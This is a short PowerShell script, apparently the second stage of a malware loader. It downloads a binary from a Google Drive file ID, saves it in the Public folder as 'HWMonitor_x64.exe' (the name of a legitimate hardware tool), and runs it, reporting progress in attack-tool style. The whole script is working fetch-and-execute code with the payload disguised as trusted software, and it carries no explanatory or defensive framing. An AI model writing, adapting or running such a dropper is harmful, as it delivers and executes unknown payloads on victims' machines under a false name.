# === Stage 2: Download and execute binary from Google Drive ===

# Replace with your actual file ID from Google Drive
$FileId = "1LRfAV0d645MM4hOQHThWy_BvDz-MpJqU"
$DownloadUrl = "https://drive.google.com/uc?export=download&id=$FileId"
$DestinationPath = "$env:PUBLIC\HWMonitor_x64.exe"

# Download the binary
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestinationPath -UseBasicParsing
    Write-Host "[+] Downloaded HWMonitor_x64.exe to $DestinationPath"
}
catch {
    Write-Host "[-] Failed to download the binary: $_"
    exit
}

# Execute the binary
try {
    Start-Process -FilePath $DestinationPath
    Write-Host "[*] Executed binary: $DestinationPath"
}
catch {
    Write-Host "[-] Failed to execute binary: $_"
}
